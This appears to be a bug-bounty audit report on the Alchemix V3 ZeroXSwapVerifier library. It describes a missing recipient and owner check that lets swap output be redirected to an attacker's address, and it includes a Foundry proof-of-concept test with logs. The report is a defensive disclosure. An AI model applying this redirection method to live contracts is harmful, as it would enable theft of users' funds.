# 58289 sc low missing addresses verification in zeroxswapverifier

**Submitted on Nov 1st 2025 at 00:52:00 UTC by @nem0thefinder for** [**Audit Comp | Alchemix V3**](https://immunefi.com/audit-competition/alchemix-v3-audit-competition)

* **Report ID:** #58289
* **Report Type:** Smart Contract
* **Report severity:** Low
* **Target:** <https://github.com/alchemix-finance/v3-poc/blob/immunefi\\_audit/src/utils/ZeroXSwapVerifier.sol>
* **Impacts:**
  * Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Summary

The `ZeroXSwapVerifier` library fails to validate the `recipient` and `owner`in 0x swap calldata, allowing operator or attackers to redirect swapped funds to arbitrary addresses during atomic deallocations.

## Description

When the vault executes atomic deallocations or force atomic deallocations, it relies on `ZeroXSwapVerifier` to validate 0x API calldata before execution. The verifier currently checks:

* Sell token matches expected token
* Slippage is within bounds
* Action types are permitted

However, it doesn't verify `owner` is the legit owner or the `recipient` field in the `SlippageAndActions` struct, which specifies where the swapped tokens are sent.

### In the atomic deallocation flow:

1. Allocator or user (via force deallocate ) provides 0x calldata
2. Strategy calls `ZeroXSwapVerifier.verifySwapCalldata()`
3. Strategy executes the calldata via 0xSettler
4. **0xSettler automatically sends output tokens to `saa.recipient`**

Without recipient and owner validation, an user or operator can set `recipient` to their own address, causing the 0xSettler to send all swapped funds to the beneficiary address instead of the strategy or vault.

```solidity
function _verifyExecuteCalldata(bytes calldata data, address owner, ...) internal view {
    (SlippageAndActions memory saa,) = abi.decode(data, (SlippageAndActions, bytes));
    // Missing: owner and recepient checks
    _verifyActions(saa.actions, owner, targetToken, maxSlippageBps);
}

function _verifyExecuteMetaTxnCalldata(bytes calldata data, address owner, ...) internal view {
    (SlippageAndActions memory saa,,,) = abi.decode(data, (SlippageAndActions, bytes[], address, bytes));
  // Missing: owner and recepient checks
    _verifyActions(saa.actions, owner, targetToken, maxSlippageBps);
}
```

## Impact

* **Direct Fund Theft**: User can set his address as `recepient` in the calldata when he is calling force deallocate or malicous operator can do the same on nomral atomic dellocation.
* **Trust assumption violation**: The verifier's entire purpose is to validate untrusted calldata; without `recipient` and `owner` checks it fails this core objective

## Mitigation

* Add `recipient` validation and `owner` in both verification functions `_verifyExecuteCalldata` and `_verifyExecuteMetaTxnCalldata`

## Proof of Concept

## Proof of Concept

> Note! the following steps applied to `ZeroxSwapVerifier.t.sol`

### 1.Paste the following test

```solidity
    function test_verifier_not_check_recepientAndOwner_are_legit () public {
        address legitRecepient = makeAddr("Vault");
        address legitOwner = owner;
        console.log("Legit owner address: ", legitOwner);
        console.log("Legit recepient address: ", legitRecepient);
        console.log("Spender address (not legit): ", spender);
        console.log("Owner address (not legit): ", spender);
        bytes memory _calldata = _buildBasicSellToPoolCalldata(token, spender, 500);
        console.log("Calldata built with spender as recepient");
        console.log("verifying calldata...");
        bool verified = ZeroXSwapVerifier.verifySwapCalldata(
            _calldata,
            spender,
            address(token),
            1000
        );
        assertTrue(verified);
        console.log("Calldata verified successfully");
        console.log("Calldata is verified even if sender is not legit owner or recepient");
        console.log("Verifer does not check that owner and recepient are legit");
    }
        
```

### 2.Run it via \`forge test --mc ZeroXSwapVerifierTest --mt test\_verifier\_not\_check\_recepientAndOwner\_are\_legit -vvv

\`

### Logs

```
Logs:
  Legit owner address:  0x0000000000000000000000000000000000000001
  Legit recepient address:  0xA79237e8Ddb8dDa413a7231b6F5ad09c383d5993
  Spender address (not legit):  0x0000000000000000000000000000000000000002
  Owner address (not legit):  0x0000000000000000000000000000000000000002
  Calldata built with spender as recepient
  verifying calldata...
  Calldata verified successfully
  Calldata is verified even if sender is not legit owner or recepient
  Verifer does not check that owner and recepient are legit


```
